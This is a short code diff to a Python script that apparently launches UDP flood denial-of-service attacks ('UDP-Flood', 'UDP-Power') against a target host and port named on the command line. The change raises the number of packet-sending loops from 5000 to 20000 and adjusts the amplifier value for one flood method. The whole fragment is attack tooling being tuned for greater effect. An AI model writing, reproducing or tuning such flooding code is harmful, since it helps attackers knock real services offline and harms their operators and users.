@@ -8,7 +8,7 @@ port = int(sys.argv[2])
 time = int(sys.argv[3])
 method = str(sys.argv[4])
 
-loops = 5000
+loops = 20000
 
 def send_packet(amplifier):
     try:
@@ -27,7 +27,7 @@ def attack_HQ():
     timeout = clock.time() + time
     if method == "UDP-Flood":
         for sequence in range(loops):
-            threading.Thread(target=send_packet(50000), daemon=True).start()
+            threading.Thread(target=send_packet(750), daemon=True).start()
     if method == "UDP-Power":
         for sequence in range(loops):
             threading.Thread(target=send_packet(750), daemon=True).start()
